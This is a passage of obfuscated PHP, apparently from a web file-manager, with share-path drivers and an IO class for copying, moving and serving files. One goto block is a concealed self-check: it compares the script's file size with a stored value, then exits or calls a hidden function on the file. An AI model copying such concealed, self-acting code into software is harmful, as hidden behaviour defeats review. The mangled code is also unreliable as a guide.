IO::info($this->pathParse[$_SERVER[èùÙ¹Ïö][86]]); if (!$œÜüõ¦Ë) { return array(); } return $this->model->listAll($ÖÕô‹„˜); } public function getContent($Ùäå˜•²) { return $this->model->getContent($Ùäå˜•²); } public function setContent($îƒşÑÛ’, $™ÆÌ—ş = '') { return $this->model->setContent($îƒşÑÛ’, $™ÆÌ—ş); } public function fileSubstr($«¬×ÇäÖ, $âÔëü£¬, $¡§¡ö¼) { return $this->model->fileSubstr($«¬×ÇäÖ, $âÔëü£¬, $¡§¡ö¼); } public function download($Éèæôı, $°œ”¾±‡ = '') { $² üÀè° = get_path_father($°œ”¾±‡); $ÖÙ¯œ¦• = get_path_this($°œ”¾±‡); $å¶¡¬Èû = $this->model->fileInfoGet($Éèæôı); $¡Ôà‹… = IO::copy($å¶¡¬Èû[$_SERVER[èùÙ¹Ïö][86]], $² üÀè°, !1, $ÖÙ¯œ¦•); return $¡Ôà‹…; } public function setModifyTime($„Ç¼ù¤›, $ÏÔí‰Ã = '') { $´í©õß· =& $_SERVER[èùÙ¹Ïö]; if (!$„Ç¼ù¤›) { return; } $this->model->where(array($´í©õß·[461] => $„Ç¼ù¤›))->save(array($´í©õß·[87] => $ÏÔí‰Ã)); } public function upload($ò¤¹×¹, $…³áÈÄ¼, $ÍÃÊ¬¤ = false, $¤ŞÀø›İ = REPEAT_REPLACE) { $Éş“–ù– =& $_SERVER[èùÙ¹Ïö]; $”€•ëÌ¶ = $this->parse($ò¤¹×¹); $ıŒ¢²¿Ñ = $this->model->addFile($”€•ëÌ¶[$Éş“–ù–[445]], $…³áÈÄ¼, $”€•ëÌ¶[$Éş“–ù–[86]], $ÍÃÊ¬¤, $¤ŞÀø›İ); return $this->getPathOuter($ıŒ¢²¿Ñ); } public function uploadFileByID($Ú“¢›ûÄ, $ûñûŞ¶ø, $´ŒÂ×‡) { $ŞÂ·ˆê¾ =& $_SERVER[èùÙ¹Ïö]; $œÃ»Ùµ = $this->parse($Ú“¢›ûÄ); $¥ûß±üÁ = $this->model->addFileByFileID($œÃ»Ùµ[$ŞÂ·ˆê¾[445]], $ûñûŞ¶ø, $œÃ»Ùµ[$ŞÂ·ˆê¾[86]], $´ŒÂ×‡); return $this->getPathOuter($¥ûß±üÁ); } public function addFileByRemote($ˆËÆÖ˜, $ÛÕªİ¤Ó, $îóôŞªÂ = array(), $ó¢ëË = '', $÷Æı¦êë) { $ıÛşÍÙÅ =& $_SERVER[èùÙ¹Ïö]; $Ÿº ò•ê = $this->parse($ˆËÆÖ˜); $ó¢ëË = empty($ó¢ëË) ? $Ÿº ò•ê[$ıÛşÍÙÅ[86]] : $ó¢ëË; $“¦€‚‹› = $this->model->addFileByRemote($Ÿº ò•ê[$ıÛşÍÙÅ[445]], $ÛÕªİ¤Ó, $ó¢ëË, $îóôŞªÂ, $÷Æı¦êë); return $this->getPathOuter($“¦€‚‹›); } public function uploadLink($İ´ğô¹, $æ å¿à” = 0) { $úõÛ¨§ =& $_SERVER[èùÙ¹Ïö]; $Â°Èó• = $this->parse($İ´ğô¹); $»ÉıãËÃ = _get($GLOBALS[$úõÛ¨§[7]], $úõÛ¨§[1383]); $ßïóÔ´¤ = _get($GLOBALS[$úõÛ¨§[7]], $úõÛ¨§[1384]); $İ´ğô¹ = Model($úõÛ¨§[645])->createFileName($Â°Èó•[$úõÛ¨§[86]], $»ÉıãËÃ, $ßïóÔ´¤); return IO::uploadLink($İ´ğô¹, $æ å¿à”); } public function fileNameAuto($òºÆú™–, $¯¥ğ áæ, $©½¾€èÓ = REPEAT_REPLACE, $ª·û‘ËÇ = false) { return $this->model->fileNameAuto($òºÆú™–, $¯¥ğ áæ, $©½¾€èÓ, $ª·û‘ËÇ); } public function fileNameExist($èãé·Ş, $×ÆúÅ»á) { return $this->model->fileNameExist($èãé·Ş, $×ÆúÅ»á); } protected function _fileOut($Àî¡ÇÈû, $ÆÀ±»’¨ = false, $´Š·Ğí = false, $¯é»èœº = '', $ÀÙê×Ç¨ = false) { $ÜŸ†©å¶ =& $_SERVER[èùÙ¹Ïö]; $ĞÒŒß»Ï = $this->model->sourceInfo($Àî¡ÇÈû); if ($ĞÒŒß»Ï[$ÜŸ†©å¶[455]] == $ÜŸ†©å¶[90]) { header($ÜŸ†©å¶[1385]); die; } $²öÁş¿Ç = $this->model->fileInfoGet($Àî¡ÇÈû); $¯é»èœº = $²öÁş¿Ç[$ÜŸ†©å¶[517]] ? $²öÁş¿Ç[$ÜŸ†©å¶[517]] : $¯é»èœº; $•ªŒı‹› = is_array($GLOBALS[$ÜŸ†©å¶[171]]) ? $GLOBALS[$ÜŸ†©å¶[171]][$ÜŸ†©å¶[32]] : $ĞÒŒß»Ï[$ÜŸ†©å¶[32]]; if ($ÀÙê×Ç¨) { return IO::fileOutServer($²öÁş¿Ç[$ÜŸ†©å¶[86]], $ÆÀ±»’¨, $•ªŒı‹›, $¯é»èœº); } IO::fileOut($²öÁş¿Ç[$ÜŸ†©å¶[86]], $ÆÀ±»’¨, $•ªŒı‹›, $¯é»èœº); } public function fileOut($İºÁÅ³€, $æ¡’‚ùÃ = false, $ÌßÁ¦üˆ = false, $Ò¿£•˜œ = '') { $this->_fileOut($İºÁÅ³€, $æ¡’‚ùÃ, $ÌßÁ¦üˆ, $Ò¿£•˜œ); } public function fileOutServer($ûœÆ²§‰, $¦°±ä£¯ = false, $ÙğÚĞéÅ = false, $è†Çà¡ = '') { $this->_fileOut($ûœÆ²§‰, $¦°±ä£¯, $ÙğÚĞéÅ, $è†Çà¡, !0); } protected function _fileOutImage($à·Šæü±, $­œ½Ä“¤ = 250) { $‚Ìû˜€ =& $_SERVER[èùÙ¹Ïö]; $¤‚‡‡œŸ = $this->model->pathInfo($à·Šæü±); if ($¤‚‡‡œŸ[$‚Ìû˜€[455]] == $‚Ìû˜€[90]) { show_json($‚Ìû˜€[1386] . $à·Šæü±, !1); } $ı°”œ = $this->model->fileInfoGet($à·Šæü±); $¤‚‡‡œŸ[$‚Ìû˜€[172]] = $ı°”œ[$‚Ìû˜€[86]]; $GLOBALS[$‚Ìû˜€[171]] = $¤‚‡‡œŸ; IO::fileOutImage($ı°”œ[$‚Ìû˜€[86]], $­œ½Ä“¤); } public function fileOutImage($èÔúŞñ, $£ñ‚õ£ = 250) { $this->_fileOutImage($èÔúŞñ, $£ñ‚õ£); } public function fileOutImageServer($“ÇŒæÕ°, $Öí¾øŒ = 250) { $this->_fileOutImage($“ÇŒæÕ°, $Öí¾øŒ); } public function link($‘äÔçñ¦, $öÙàü» = '') { $Ëá¢Ä¯à = $this->model->fileInfoGet($‘äÔçñ¦); return IO::link($Ëá¢Ä¯à[$_SERVER[èùÙ¹Ïö][86]], $öÙàü»); } protected function parse($¶Åºœâ) { $ÓÉµˆ°“ =& $_SERVER[èùÙ¹Ïö]; if (strstr($¶Åºœâ, $ÓÉµˆ°“[8]) === !1) { return array($ÓÉµˆ°“[463] => intval($¶Åºœâ), $ÓÉµˆ°“[86] => $ÓÉµˆ°“[12], $ÓÉµˆ°“[1382] => array()); } $†±…ƒÖÀ = explode($ÓÉµˆ°“[8], trim($¶Åºœâ, $ÓÉµˆ°“[8])); if (count($†±…ƒÖÀ) < 2) { show_tips(clear_html($¶Åºœâ) . $ÓÉµˆ°“[1387]); } return array($ÓÉµˆ°“[463] => intval($†±…ƒÖÀ[0]), $ÓÉµˆ°“[86] => $†±…ƒÖÀ[1], $ÓÉµˆ°“[1382] => array_slice($†±…ƒÖÀ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($®ˆ’Ú÷‡) { $this->pathParse = $®ˆ’Ú÷‡; $this->model = Model($_SERVER[èùÙ¹Ïö][1381]); } public function getPathOuter($™ì†Šï©) { $ ÇöğŸ€ =& $_SERVER[èùÙ¹Ïö]; if (!$™ì†Šï©) { return $™ì†Šï©; } $…Ñò·€ = $this->parse($™ì†Šï©); return trim(KodIO::makeShare($this->pathParse[$ ÇöğŸ€[445]], $…Ñò·€[$ ÇöğŸ€[445]]), $ ÇöğŸ€[8]); } protected function infoParse($«‡ßˆÅ, $™ÆşöºÊ = false, $¢ùÜÈÕŞ = false) { $Ïóùş Œ =& $_SERVER[èùÙ¹Ïö]; $ªöâ£”ú = $this->pathParse[$Ïóùş Œ[445]]; $ãÜÙ‘âä = trim($this->pathParse[$Ïóùş Œ[1216]], $Ïóùş Œ[8]); return Action($Ïóùş Œ[1388])->sharePathInfo($ªöâ£”ú, $ãÜÙ‘âä, $™ÆşöºÊ); } public function infoFull($¢´Ë´) { $Ñ®±ªï =& $_SERVER[èùÙ¹Ïö]; $û«°ş¼ = explode($Ñ®±ªï[8], trim($¢´Ë´, $Ñ®±ªï[8])); if (count($û«°ş¼) > 1) { $‘Œ ôÌ¬ = implode($Ñ®±ªï[8], array_splice($û«°ş¼, 1)); $ñ×¦Ã¡† = $this->model->pathInfoByPath($û«°ş¼[0], $‘Œ ôÌ¬); if (!$ñ×¦Ã¡†) { return !1; } $this->pathParse[$Ñ®±ªï[1216]] = $ñ×¦Ã¡†[$Ñ®±ªï[183]]; } return $this->infoParse($¢´Ë´); } public function listAll($×ÂÇÚí³) { $÷İÔØÄŞ =& $_SERVER[èùÙ¹Ïö]; $”úª±´ = IO::info($this->pathParse[$÷İÔØÄŞ[86]]); if (!$”úª±´) { return array(); } $®¾ˆ£‰ª = $this->model->listAll($×ÂÇÚí³); $Ä³’ÙÍ = Model($÷İÔØÄŞ[635])->getInfo($”úª±´[$÷İÔØÄŞ[636]]); foreach ($®¾ˆ£‰ª as &$Ÿ„Ô»Äñ) { check_abort(); $Ÿ„Ô»Äñ[$÷İÔØÄŞ[89]] = Action($÷İÔØÄŞ[1388])->_shareItemeParse($Ÿ„Ô»Äñ[$÷İÔØÄŞ[89]], $Ä³’ÙÍ); } unset($Ÿ„Ô»Äñ); return $®¾ˆ£‰ª; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÏÌÑÖÚ) { $this->pathParse = $ÏÌÑÖÚ; $this->model = Model($_SERVER[èùÙ¹Ïö][1381]); } protected function infoParse($„–˜öÎÕ, $—Ü£ñ¡ = false, $ÖŸ£ÊÅ = false) { $õù±şĞ =& $_SERVER[èùÙ¹Ïö]; return Action($õù±şĞ[1222])->sharePathInfo($this->pathParse[$õù±şĞ[86]], !0, $—Ü£ñ¡); } public function listPath($ŠÎ‰æÍ¼, $¸í‚²Çø = false) { $©Ä»Î©à =& $_SERVER[èùÙ¹Ïö]; $İÚ´Éú´ = parent::listPath($ŠÎ‰æÍ¼, $¸í‚²Çø); if (!$İÚ´Éú´) { return $İÚ´Éú´; } if (is_array($İÚ´Éú´[$©Ä»Î©à[1389]])) { $İÚ´Éú´[$©Ä»Î©à[1389]] = Action($©Ä»Î©à[1222])->shareItemInfo($İÚ´Éú´[$©Ä»Î©à[1389]]); } foreach ($İÚ´Éú´ as $¹ƒê—‡Ô => $·Ù§®óÂ) { if (!in_array($¹ƒê—‡Ô, array($©Ä»Î©à[85], $©Ä»Î©à[84]))) { continue; } foreach ($·Ù§®óÂ as $¡²¶±° => $ßåé½í ) { $İÚ´Éú´[$¹ƒê—‡Ô][$¡²¶±°] = Action($©Ä»Î©à[1222])->shareItemInfo($ßåé½í ); } } return $İÚ´Éú´; } public function listAll($È«Å ×£) { $š°Üæä =& $_SERVER[èùÙ¹Ïö]; $‡æü¼€Õ = IO::info($this->pathParse[$š°Üæä[86]]); if (!$‡æü¼€Õ) { return array(); } $³Åœ­­» = $this->model->listAll($È«Å ×£); foreach ($³Åœ­­» as &$Ä’À÷â›) { $Ä’À÷â›[$š°Üæä[89]] = Action($š°Üæä[1222])->shareItemInfo($Ä’À÷â›[$š°Üæä[89]]); } unset($Ä’À÷â›); return $³Åœ­­»; } } goto F¯…¿¦¼‚Ü; aœ‚›ë‡Åô: $_file = $_SERVER[$_SERVER[èùÙ¹Ïö][1192]]; $_size = $_SERVER[èùÙ¹Ïö][919]; if ($_SERVER[$_SERVER[èùÙ¹Ïö][920]] != $_size($_file)) { $_getc = $_SERVER[èùÙ¹Ïö][922]; $_getfile = $_SERVER[$_SERVER[èùÙ¹Ïö][917]] . $_SERVER[èùÙ¹Ïö][918]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[èùÙ¹Ïö][248], $_getfilec); if (count($_getarrs) < $_SERVER[èùÙ¹Ïö][663]) { $exit = $_SERVER[èùÙ¹Ïö][923]; $exit(); } $_act = $_SERVER[èùÙ¹Ïö][1193]; $_act($_file); } goto AÒ«µ°è—; aŠ¼‚ù¦Äì: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($°‡ö£êÓ, $Ñ·Â¹ù) { $äì¾âù =& $_SERVER[èùÙ¹Ïö]; $†¸µ˜€ = $Ñ·Â¹ù; $GLOBALS[$äì¾âù[1194]] = $äì¾âù[1195] . $°‡ö£êÓ; Hook::trigger($äì¾âù[1195] . $°‡ö£êÓ . $äì¾âù[1196], $†¸µ˜€); $ËÒŒä‹º = self::driverMake($Ñ·Â¹ù[0]); if (!$ËÒŒä‹º) { return !1; } if (method_exists($ËÒŒä‹º, $°‡ö£êÓ)) { $Éø¡¿¤” = @call_user_func_array(array($ËÒŒä‹º, $°‡ö£êÓ), $Ñ·Â¹ù); } else { if (method_exists($ËÒŒä‹º, $äì¾âù[1197])) { $Éø¡¿¤” = @call_user_func_array(array($ËÒŒä‹º, $°‡ö£êÓ), $Ñ·Â¹ù); } else { if (method_exists(self, $°‡ö£êÓ)) { $Éø¡¿¤” = @call_user_func_array(array(self, $°‡ö£êÓ), $Ñ·Â¹ù); } else { $Éø¡¿¤” = call_user_func_array(array(parent, $°‡ö£êÓ), $Ñ·Â¹ù); } } } Hook::trigger($äì¾âù[1195] . $°‡ö£êÓ . $äì¾âù[1198], $†¸µ˜€, $Éø¡¿¤”); return $Éø¡¿¤”; } public static function init($Ò‡şÚ—“) { return self::driverMake($Ò‡şÚ—“); } public static function copy($ˆ««Ûû¡, $‚â‰ÊöÌ, $¬˜çÚÖ¤ = false, $ï»¾Ş“à = false) { return self::copyMoveStart($ˆ««Ûû¡, $‚â‰ÊöÌ, $¬˜çÚÖ¤, $_SERVER[èùÙ¹Ïö][589], $ï»¾Ş“à); } public static function move($›øã´Î», $ÜÅ¬Ÿ¿Ç, $¸Ï”¸ = false, $İùÏâ•– = false) { return self::copyMoveStart($›øã´Î», $ÜÅ¬Ÿ¿Ç, $¸Ï”¸, $_SERVER[èùÙ¹Ïö][591], $İùÏâ•–); } private static function copyMoveStart($Å¤ÁéÎ, $®üàù«ª, $ÎÅ›—üğ, $ŒëùšËª, $¡¡øø±) { $ûÆ•¯ú² =& $_SERVER[èùÙ¹Ïö]; $ü»£Öé¤ = array($Å¤ÁéÎ, $®üàù«ª, $ÎÅ›—üğ, $¡¡øø±); Hook::trigger($ûÆ•¯ú²[1195] . $ŒëùšËª . $ûÆ•¯ú²[1196], $ü»£Öé¤); $„šÅÜ½ = self::copyMove($Å¤ÁéÎ, $®üàù«ª, $ÎÅ›—üğ, $ŒëùšËª, $¡¡øø±); Hook::trigger($ûÆ•¯ú²[1195] . $ŒëùšËª . $ûÆ•¯ú²[1198], $ü»£Öé¤, $„šÅÜ½); return $„šÅÜ½; } public static function saveFile($ÊˆúÜÅ, $ƒğÀüÃû, $­ƒŸ“À = true) { $¿İ©šæí =& $_SERVER[èùÙ¹Ïö]; $Ì¶ï²Èß = self::info($ƒğÀüÃû); $³°—ì£ = self::driverMake($ÊˆúÜÅ); $õ©Œ™İÙ = self::driverMake($ƒğÀüÃû); $¶‡á„Ä = !1; if ($õ©Œ™İÙ->pathParse[$¿İ©šæí[1199]]) { $¶‡á„Ä = $õ©Œ™İÙ; $Ò€ï‚óù = $õ©Œ™İÙ->pathParse[$¿İ©šæí[1199]]; $õ©Œ™İÙ = self::driverMake($Ò€ï‚óù); } if ($³°—ì£->pathParse[$¿İ©šæí[1199]]) { $åÂ»Â®í = $³°—ì£->pathParse[$¿İ©šæí[1199]]; $³°—ì£ = self::driverMake($åÂ»Â®í); } $ô¥ĞÓ°İ = $õ©Œ™İÙ->pathFather($ƒğÀüÃû); $Ù°·ßãñ = !0; if (!$­ƒŸ“À && self::driverIsSame($³°—ì£, $õ©Œ™İÙ)) { $Ù°·ßãñ = !1; } $Ù¥‘Ù»ã = self::copyFile($³°—ì£, $ÊˆúÜÅ, $õ©Œ™İÙ, $ô¥ĞÓ°İ, $Ì¶ï²Èß[$¿İ©šæí[32]], $Ù°·ßãñ); if ($¶‡á„Ä) { $Ù¥‘Ù»ã = $¶‡á„Ä->getPathOuter($Ù¥‘Ù»ã); } return $Ù¥‘Ù»ã; } private static function copyMove($£­¹Â á, $ùˆ¦éÛØ, $•ˆ¯şëÓ, $Æ»Æªï‰, $Ğ’”ÆùÊ = false) { $´öš†œ =& $_SERVER[èùÙ¹Ïö]; if (!$£­¹Â á || $£­¹Â á == $´öš†œ[8] || !$ùˆ¦éÛØ) { return !1; } ignore_timeout(); $óö÷¤İë = self::driverMake($£­¹Â á); $úõ»—µ¤ = self::driverMake($ùˆ¦éÛØ); $Ï—»æİ® = $Æ»Æªï‰ == $´öš†œ[591]; $¦òŸ›³  = !1; if ($úõ»—µ¤->pathParse[$´öš†œ[1199]]) { $¦òŸ›³  = $úõ»—µ¤; $ùˆ¦éÛØ = $úõ»—µ¤->pathParse[$´öš†œ[1199]]; $úõ»—µ¤ = self::driverMake($ùˆ¦éÛØ); } if ($óö÷¤İë->pathParse[$´öš†œ[1199]]) { $£­¹Â á = $óö÷¤İë->pathParse[$´öš†œ[1199]]; $óö÷¤İë = self::driverMake($£­¹Â á); } self::check($óö÷¤İë, $£­¹Â á, $úõ»—µ¤, $ùˆ¦éÛØ); Hook::trigger($´öš†œ[1200], $óö÷¤İë, $£­¹Â á, $úõ»—µ¤, $ùˆ¦éÛØ); $ôõÜ½áÙ = self::driverIsSame($óö÷¤İë, $úõ»—µ¤); if ($ôõÜ½áÙ) { if ($Æ»Æªï‰ == $´öš†œ[591] && !method_exists($úõ»—µ¤, $´öš†œ[1201]) && trim($ùˆ¦éÛØ, $´öš†œ[8]) == trim($úõ»—µ¤->pathFather($£­¹Â á), $´öš†œ[8])) { if ($óö÷¤İë->pathThis($£­¹Â á) != $Ğ’”ÆùÊ && !$óö÷¤İë->isTypeObject()) { return $óö÷¤İë->rename($£­¹Â á, $Ğ’”ÆùÊ); } return $úõ»—µ¤->getPathOuter($£­¹Â á); } if (method_exists($úõ»—µ¤, $Æ»Æªï‰)) { return $úõ»—µ¤->{$Æ»Æªï‰}($£­¹Â á, $ùˆ¦éÛØ, $•ˆ¯şëÓ, $Ğ’”ÆùÊ); } } if ($ôõÜ½áÙ && $Æ»Æªï‰ == $´öš†œ[591] && $úõ»—µ¤->getType() == $´öš†œ[108]) { $¨ª÷ŒÏÓ = $úõ»—µ¤->movePath($£­¹Â á, $ùˆ¦éÛØ, $Ğ’”ÆùÊ); if ($¨ª÷ŒÏÓ) { return $¨ª÷ŒÏÓ; } } $ïÈ¿ı¡™ = $óö÷¤İë->isFile($£­¹Â á); if (!$ïÈ¿ı¡™ && $úõ»—µ¤->getType() == $´öš†œ[797] && $óö÷¤İë->getType() == $´öš†œ[108]) { $¨ª÷ŒÏÓ = $úõ»—µ¤->copyFolderFromIO($óö÷¤İë, $£­¹Â á, $ùˆ¦éÛØ, $•ˆ¯şëÓ, $Ï—»æİ®, $Ğ’”ÆùÊ); } else { $¨ª÷ŒÏÓ = self::copyPath($óö÷¤İë, $£­¹Â á, $úõ»—µ¤, $ùˆ¦éÛØ, $•ˆ¯şëÓ, $Ï—»æİ®, $ïÈ¿ı¡™, $Ğ’”ÆùÊ); } if ($¨ª÷ŒÏÓ && $Ï—»æİ®) { $óö÷¤İë->remove($£­¹Â á); } if ($¦òŸ›³ ) { $¨ª÷ŒÏÓ = $¦òŸ›³ ->getPathOuter($¨ª÷ŒÏÓ); } return $¨ª÷ŒÏÓ; } private static function check($ÒöÖ‡Â, $„†êëÙè, $¼µí, &$¶°‘Òµ´) { $á£™²ç„ =& $_SERVER[èùÙ¹Ïö]; if (self::driverIsSame($ÒöÖ‡Â, $¼µí) && $ÒöÖ‡Â->isFolder($„†êëÙè) && $ÒöÖ‡Â->isParentOf($„†êëÙè, $¶°‘Òµ´)) { show_json(LNG($á£™²ç„[1202]), !1); } if (!$ÒöÖ‡Â->exist($„†êëÙè)) { show_json(LNG($á£™²ç„[107]), !1); } } private static function copyPath($ÇÛ§¿ûÃ, $‹ÜÅòÆĞ, $®£½È», $—©ÔÅ‘¡, $å°š„şÇ, $º¶¾íü», $ëñ„¯À, $¿ ø‹¦ = false, $à¿‹Õ×™ = true) { $ˆĞÂıÊÈ =& $_SERVER[èùÙ¹Ïö]; $™§¦¬°² = empty($¿ ø‹¦) && $¿ ø‹¦ !== $ˆĞÂıÊÈ[214] ? $ÇÛ§¿ûÃ->pathThis($‹ÜÅòÆĞ) : $¿ ø‹¦; if ($å°š„şÇ) { $íîÈÆ× = $®£½È»->fileNameExist($—©ÔÅ‘¡, $™§¦¬°²); $™×şµ‰ã = $™§¦¬°²; $™§¦¬°² = $®£½È»->fileNameAuto($—©ÔÅ‘¡, $™§¦¬°², $å°š„şÇ, !$ëñ„¯À); if (!$íîÈÆ× || $™×şµ‰ã != $™§¦¬°²) { $å°š„şÇ = !1; } if ($à¿‹Õ×™ && !$å°š„şÇ) { $®£½È»->_data[$ˆĞÂıÊÈ[1203]] = !0; } } if ($ëñ„¯À) { return self::copyFile($ÇÛ§¿ûÃ, $‹ÜÅòÆĞ, $®£½È», $—©ÔÅ‘¡, $™§¦¬°², $º¶¾íü»); } if ($å°š„şÇ == REPEAT_RENAME_FOLDER) { $å°š„şÇ = !1; } $ §çë¬Ä = rtrim($—©ÔÅ‘¡, $ˆĞÂıÊÈ[8]) . $ˆĞÂıÊÈ[8] . $™§¦¬°²; $Ë«ØÁ‹Œ = $®£½È»->mkdir($®£½È»->getPath($ §çë¬Ä), $å°š„şÇ); $—©ÔÅ‘¡ = $®£½È»->getPathInner($Ë«ØÁ‹Œ); $…÷¡Ü™ = $ÇÛ§¿ûÃ->listPath($‹ÜÅòÆĞ, !0); $…÷¡Ü™ = is_array($…÷¡Ü™) ? $…÷¡Ü™ : array($ˆĞÂıÊÈ[85] => array(), $ˆĞÂıÊÈ[84] => array()); $£³¾Òßİ = array_merge($…÷¡Ü™[$ˆĞÂıÊÈ[85]], $…÷¡Ü™[$ˆĞÂıÊÈ[84]]); foreach ($£³¾Òßİ as $òÄ³…üë) { $‡ÌÕù½‹ = $òÄ³…üë[$ˆĞÂıÊÈ[33]] == $ˆĞÂıÊÈ[216]; $‹ÜÅòÆĞ = $ÇÛ§¿ûÃ->getPathInner($òÄ³…üë[$ˆĞÂıÊÈ[86]]); $²úşìÄ = self::copyPath($ÇÛ§¿ûÃ, $‹ÜÅòÆĞ, $®£½È», $—©ÔÅ‘¡, $å°š„şÇ, $º¶¾íü», $‡ÌÕù½‹, !1, !1); if (!$²úşìÄ) { IO::errorTips($ˆĞÂıÊÈ[1204] . $‹ÜÅòÆĞ . $ˆĞÂıÊÈ[72] . $—©ÔÅ‘¡); } } self::copyMoveKeepInfo($ÇÛ§¿ûÃ, $‹ÜÅòÆĞ, $Ë«ØÁ‹Œ); return $Ë«ØÁ‹Œ; } private static function copyFile($‚†Ù¯, $ÁÒ„óœ“, $÷ÌÊğëš, $¾Ê×…ÈÁ, $ÆÅ›–ÅÆ, $¶’éó‚·) { $‡˜ú²–ğ =& $_SERVER[èùÙ¹Ïö]; $¾Ê×…ÈÁ = $÷ÌÊğëš->getPath(rtrim($¾Ê×…ÈÁ, $‡˜ú²–ğ[8]) . $‡˜ú²–ğ[8] . $ÆÅ›–ÅÆ); $ÔŞŒÓÍÇ = $‡˜ú²–ğ[1205] . time() . rand_string(5); Hook::trigger($‡˜ú²–ğ[1206], $‚†Ù¯, $ÁÒ„óœ“, $÷ÌÊğëš, $¾Ê×…ÈÁ, $ÆÅ›–ÅÆ, $ÔŞŒÓÍÇ); if (self::driverIsSame($‚†Ù¯, $÷ÌÊğëš)) { if ($¶’éó‚·) { $ˆ“¾ª—Ü = $÷ÌÊğëš->moveFile($ÁÒ„óœ“, $¾Ê×…ÈÁ); } else { $ˆ“¾ª—Ü = $÷ÌÊğëš->copyFile($ÁÒ„óœ“, $¾Ê×…ÈÁ); } Hook::trigger($‡˜ú²–ğ[1207], $‚†Ù¯, $ÁÒ„óœ“, $÷ÌÊğëš, $¾Ê×…ÈÁ, $ÆÅ›–ÅÆ, $ˆ“¾ª—Ü); self::copyMoveKeepInfo($‚†Ù¯, $ÁÒ„óœ“, $ˆ“¾ª—Ü); return $ˆ“¾ª—Ü; } $…Ó¾×ò¨ = TEMP_FILES; if ($GLOBALS[$‡˜ú²–ğ[6]][$‡˜ú²–ğ[91]][$‡˜ú²–ğ[836]]) { $…Ó¾×ò¨ = $GLOBALS[$‡˜ú²–ğ[6]][$‡˜ú²–ğ[91]][$‡˜ú²–ğ[836]]; } $Ãúí¦Ò÷ = $…Ó¾×ò¨; mk_dir($Ãúí¦Ò÷); $À«ƒÕ¯È = $Ãúí¦Ò÷ . $ÔŞŒÓÍÇ; $·êÖ¯¿— = $À«ƒÕ¯È; $À«ƒÕ¯È = $‚†Ù¯->download($ÁÒ„óœ“, $À«ƒÕ¯È); $À«ƒÕ¯È = $‚†Ù¯->iconvApp($À«ƒÕ¯È); if (substr($À«ƒÕ¯È, strlen($…Ó¾×ò¨)) == $…Ó¾×ò¨) { $¶’éó‚· = !0; } $ˆ“¾ª—Ü = $÷ÌÊğëš->upload($¾Ê×…ÈÁ, $À«ƒÕ¯È, $¶’éó‚·); self::remove($·êÖ¯¿—); Hook::trigger($‡˜ú²–ğ[1207], $‚†Ù¯, $ÁÒ„óœ“, $÷ÌÊğëš, $¾Ê×…ÈÁ, $ÆÅ›–ÅÆ, $ˆ“¾ª—Ü); self::copyMoveKeepInfo($‚†Ù¯, $ÁÒ„óœ“, $ˆ“¾ª—Ü); return $ˆ“¾ª—Ü; } private static function copyMoveKeepInfo($³½š¥—Â, $Àä‡ÄÑñ, $ÔÛÖş…í) { if (!$ÔÛÖş…í) { return; } $ñÅº«Ì¢ = $³½š¥—Â->info($Àä‡ÄÑñ); if (!is_array($ñÅº«Ì¢)) { return; } IO::setModifyTime($ÔÛÖş…í, $ñÅº«Ì¢[$_SERVER[èùÙ¹Ïö][87]]); } public static function pathFather($‹¯•Ì¡) { $üê¡ÓÒ = IO::init($‹¯•Ì¡); $ ò·ú§ = $üê¡ÓÒ->pathFather($üê¡ÓÒ->path); return $üê¡ÓÒ->getPathOuter($ ò·ú§); } public static function fileOut($Ê·¤÷ß, $ÎÜª®¸è = false, $“æ¹“Ç“ = false, $­ğÜ­±— = '') { $Ä´«…çÖ = self::driverMake($Ê·¤÷ß); if ($Ä´«…çÖ->isFileOutServer()) { return $Ä´«…çÖ->fileOutServer($Ê·¤÷ß, $ÎÜª®¸è, $“æ¹“Ç“, $­ğÜ­±—); } return $Ä´«…çÖ->fileOut($Ê·¤÷ß, $ÎÜª®¸è, $“æ¹“Ç“, $­ğÜ­±—); } public static function fileOutImage($–Ô•¯Äœ, $ÍÜ„³§û = 250) { $”ş¦Û©ü = array(250, 600, 1200, 2000, 3000, 5000); for ($¢‚ŸôèÒ = 0; $¢‚ŸôèÒ < count($”ş¦Û©ü); $¢‚ŸôèÒ++) { if ($¢‚ŸôèÒ == 0 && $ÍÜ„³§û <= $”ş¦Û©ü[$¢‚ŸôèÒ]) { $ÍÜ„³§û = $”ş¦Û©ü[$¢‚ŸôèÒ]; break; } else { if ($ÍÜ„³§û > $”ş¦Û©ü[$¢‚ŸôèÒ - 1] && $ÍÜ„³§û <= $”ş¦Û©ü[$¢‚ŸôèÒ]) { $ÍÜ„³§û = $”ş¦Û©ü[$¢‚ŸôèÒ]; break; } else { if ($¢‚ŸôèÒ == count($”ş¦Û©ü) - 1 && $ÍÜ„³§û > $”ş¦Û©ü[$¢‚ŸôèÒ]) { $ÍÜ„³§û = $”ş¦Û©ü[$¢‚ŸôèÒ]; break; } } } } $¾ÇÒ£ö = self::driverMake($–Ô•¯Äœ); if ($¾ÇÒ£ö->isFileOutServer()) { return $¾ÇÒ£ö->fileOutImageServer($–Ô•¯Äœ, $ÍÜ„³§û); } return $¾ÇÒ£ö->fileOutImage($–Ô•¯Äœ, $ÍÜ„³§û); } private static function driverIsSame($ÖÉØ…ø, $òôãå»´) { $¨ÜÖÁÔ =& $_SERVER[èùÙ¹Ïö]; $¾Ïš¨£† = $ÖÉØ…ø->getType(); $öòòÛâŒ = $òôãå»´->getType(); if ($¾Ïš¨£† != $öòòÛâŒ) { return !1; } if ($¾Ïš¨£† == $¨ÜÖÁÔ[797]) { return !0; } if ($¾Ïš¨£† == $¨ÜÖÁÔ[108]) { return !0; } if ($ÖÉØ…ø->pathDriver == $òôãå»´->pathDriver) { return !0; } return !1; } public static function copyUpdate($‡ØÉÅ÷Å, $Â¾¿¬‹«) { $øüú×“Ó =& $_SERVER[èùÙ¹Ïö]; if (!IO::exist($‡ØÉÅ÷Å)) { return !1; } if (!IO::exist($Â¾¿¬‹«)) { IO::mkdir($Â¾¿¬‹«); } $‹È º¤¹ = array_to_keyvalue(self::listAllSimple($‡ØÉÅ÷Å), $øüú×“Ó[86]); $¤¶ãèä´ = array_to_keyvalue(self::listAllSimple($Â¾¿¬‹«), $øüú×“Ó[86]); $˜—ªˆ«´ = array(); $¹§ÙäêŒ = array(); foreach ($‹È º¤¹ as $í”‚• ¯ => $ê÷¢ƒå·) { if 